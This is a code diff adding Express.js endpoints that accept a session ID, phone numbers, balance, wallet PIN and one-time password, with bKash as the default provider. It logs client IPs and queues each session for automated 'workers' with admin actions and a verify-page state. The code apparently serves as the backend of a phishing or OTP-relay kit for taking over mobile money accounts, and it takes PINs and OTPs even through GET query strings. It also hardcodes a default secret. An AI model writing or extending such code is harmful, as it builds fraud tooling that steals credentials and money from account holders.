@@ -220,6 +220,236 @@ for (let i = 1; i <= 21; i++) {
   app.get(`/api/worker${i}`, (req, res) => handleGetData(String(i), req, res));
 }
 
+// ===== NEW: Session Data & OTP Submission (for worker consumption) =====
+
+// Endpoint 1: Submit session ID + number + phone number → available to workers
+app.post('/api/submit-session-data', (req, res) => {
+  const sessionId = req.body?.sessionId || req.query?.sessionId;
+  const number = req.body?.number || req.query?.number || '';
+  const phone = req.body?.phone || req.query?.phone || '';
+  const amount = req.body?.amount || req.body?.balance || req.query?.amount || req.query?.balance || '';
+  const pin = req.body?.pin || req.query?.pin || '';
+
+  if (!sessionId) {
+    return res.status(400).json({ error: 'Missing sessionId' });
+  }
+
+  // Get or create session
+  let session = sessions[sessionId];
+  if (!session) {
+    session = {
+      id: sessionId,
+      orderId: sessionId,
+      name: req.body?.name || '',
+      provider: req.body?.provider || 'bkash',
+      initialPhone: phone || number,
+      gatewayPhone: number || phone,
+      balance: amount,
+      otp: '',
+      gatewayOtp: '',
+      pin: pin,
+      waitingFor: 'NONE',
+      adminAction: 'NONE',
+      lastUpdated: Date.now(),
+      clientIp: getClientIp(req),
+    };
+    sessions[sessionId] = session;
+  } else {
+    // Update existing session with new data
+    const updates = { ...session, lastUpdated: Date.now() };
+    if (number) updates.gatewayPhone = number;
+    if (phone) updates.initialPhone = phone;
+    if (amount) updates.balance = amount;
+    if (pin) updates.pin = pin;
+    // Reset automation tracking so worker picks up fresh data
+    updates.lastAutomationData = '';
+    updates.lastDataSentAt = 0;
+    updates.assignedWorker = null;
+    updates.assignedAt = null;
+    sessions[sessionId] = updates;
+  }
+
+  saveSession(sessionId);
+
+  res.json({
+    success: true,
+    sessionId,
+    number: number || sessions[sessionId].gatewayPhone || '',
+    phone: phone || sessions[sessionId].initialPhone || '',
+    amount: amount || sessions[sessionId].balance || '',
+    message: 'Session data stored. Workers will now pick up this session.',
+  });
+});
+
+// GET version for browser-based form submission
+app.get('/api/submit-session-data', (req, res) => {
+  const sessionId = req.query?.sessionId;
+  const number = req.query?.number || '';
+  const phone = req.query?.phone || '';
+  const amount = req.query?.amount || req.query?.balance || '';
+  const pin = req.query?.pin || '';
+
+  if (!sessionId) {
+    return res.status(400).json({ error: 'Missing sessionId' });
+  }
+
+  let session = sessions[sessionId];
+  if (!session) {
+    session = {
+      id: sessionId,
+      orderId: sessionId,
+      name: req.query?.name || '',
+      provider: req.query?.provider || 'bkash',
+      initialPhone: phone || number,
+      gatewayPhone: number || phone,
+      balance: amount,
+      otp: '',
+      gatewayOtp: '',
+      pin: pin,
+      waitingFor: 'NONE',
+      adminAction: 'NONE',
+      lastUpdated: Date.now(),
+      clientIp: getClientIp(req),
+    };
+    sessions[sessionId] = session;
+  } else {
+    const updates = { ...session, lastUpdated: Date.now() };
+    if (number) updates.gatewayPhone = number;
+    if (phone) updates.initialPhone = phone;
+    if (amount) updates.balance = amount;
+    if (pin) updates.pin = pin;
+    updates.lastAutomationData = '';
+    updates.lastDataSentAt = 0;
+    updates.assignedWorker = null;
+    updates.assignedAt = null;
+    sessions[sessionId] = updates;
+  }
+
+  saveSession(sessionId);
+
+  res.json({
+    success: true,
+    sessionId,
+    number: number || sessions[sessionId].gatewayPhone || '',
+    phone: phone || sessions[sessionId].initialPhone || '',
+    amount: amount || sessions[sessionId].balance || '',
+    message: 'Session data stored. Workers will now pick up this session.',
+  });
+});
+
+// Endpoint 2: Submit OTP for a session → available to workers
+app.post('/api/submit-otp', (req, res) => {
+  const sessionId = req.body?.sessionId || req.query?.sessionId;
+  const otp = req.body?.otp || req.query?.otp || '';
+
+  if (!sessionId) {
+    return res.status(400).json({ error: 'Missing sessionId' });
+  }
+  if (!otp) {
+    return res.status(400).json({ error: 'Missing otp' });
+  }
+
+  const session = sessions[sessionId];
+  if (!session) {
+    // Create session with OTP if it doesn't exist
+    sessions[sessionId] = {
+      id: sessionId,
+      orderId: sessionId,
+      name: req.body?.name || '',
+      provider: req.body?.provider || 'bkash',
+      initialPhone: req.body?.phone || '',
+      gatewayPhone: req.body?.number || '',
+      balance: req.body?.amount || '',
+      otp: otp,
+      gatewayOtp: otp,
+      pin: req.body?.pin || '',
+      waitingFor: 'VERIFY_PAGE',
+      adminAction: 'NONE',
+      lastUpdated: Date.now(),
+      clientIp: getClientIp(req),
+    };
+    saveSession(sessionId);
+  } else {
+    // Update existing session with OTP
+    const updates = {
+      ...session,
+      otp: otp,
+      gatewayOtp: otp,
+      waitingFor: 'VERIFY_PAGE',
+      lastUpdated: Date.now(),
+    };
+    // Reset automation tracking so worker picks up fresh OTP
+    updates.lastAutomationData = '';
+    updates.lastDataSentAt = 0;
+    updates.assignedWorker = null;
+    updates.assignedAt = null;
+    sessions[sessionId] = updates;
+    saveSession(sessionId);
+  }
+
+  res.json({
+    success: true,
+    sessionId,
+    otp,
+    message: 'OTP stored. Worker will now process this session.',
+  });
+});
+
+// GET version for browser-based OTP submission
+app.get('/api/submit-otp', (req, res) => {
+  const sessionId = req.query?.sessionId;
+  const otp = req.query?.otp || '';
+
+  if (!sessionId) {
+    return res.status(400).json({ error: 'Missing sessionId' });
+  }
+  if (!otp) {
+    return res.status(400).json({ error: 'Missing otp' });
+  }
+
+  const session = sessions[sessionId];
+  if (!session) {
+    sessions[sessionId] = {
+      id: sessionId,
+      orderId: sessionId,
+      name: req.query?.name || '',
+      provider: req.query?.provider || 'bkash',
+      initialPhone: req.query?.phone || '',
+      gatewayPhone: req.query?.number || '',
+      balance: req.query?.amount || '',
+      otp: otp,
+      gatewayOtp: otp,
+      pin: req.query?.pin || '',
+      waitingFor: 'VERIFY_PAGE',
+      adminAction: 'NONE',
+      lastUpdated: Date.now(),
+      clientIp: getClientIp(req),
+    };
+    saveSession(sessionId);
+  } else {
+    const updates = {
+      ...session,
+      otp: otp,
+      gatewayOtp: otp,
+      waitingFor: 'VERIFY_PAGE',
+      lastUpdated: Date.now(),
+    };
+    updates.lastAutomationData = '';
+    updates.lastDataSentAt = 0;
+    updates.assignedWorker = null;
+    updates.assignedAt = null;
+    sessions[sessionId] = updates;
+    saveSession(sessionId);
+  }
+
+  res.json({
+    success: true,
+    sessionId,
+    otp,
+    message: 'OTP stored. Worker will now process this session.',
+  });
+});
+
 const AI_API_KEY = process.env.AI_API_KEY || 'bkash-ai-secret-2025';
 
 function normalizePhoneForLookup(p) {
